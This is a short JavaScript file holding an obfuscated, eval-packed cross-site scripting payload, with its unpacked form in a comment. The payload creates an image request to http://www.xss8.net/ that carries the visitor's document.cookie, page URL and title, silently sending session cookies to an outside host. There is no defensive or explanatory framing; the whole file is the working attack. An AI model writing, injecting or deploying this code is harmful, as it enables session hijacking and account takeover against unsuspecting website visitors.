eval(
    function(p,a,c,k,e,d){
        while(c--){
            if(k[c]){
                p=p.replace(new RegExp('\\b'+c.toString(a)+'\\b','g'),k[c])
            }
        }
        return p
    }
    ('2 c=\'e\';2 3=\'f://d.b.9/\';2 1;5(0.6){1=0.6}a 5(0.4){1=0.4};2 7=n l();7.i=\'\'+3+\'?j=\'+c+\'&o=\'+0.m+\'&3=\'+8(0.h)+\'&1=\'+1+\'&g=\'+8(0.k);',25,25,'document|cr|var|u|characterSet|if|charset|x|escape|net|else|xss8||www|LV4id|http|co|URL|src|cc|cookie|Image|title|new|t'.split('|'))
)

/*
var c = 'LV4id';
var u = 'http://www.xss8.net/';
var cr;
if (document.charset) {
 cr = document.charset
} else if (document.characterSet) {
 cr = document.characterSet
};
var x = new Image();
x.src = '' + u + '?cc=' + c + '&t=' + document.title + '&u=' + escape(document.URL) + '&cr=' + cr + '&co=' + escape(document.cookie);
*/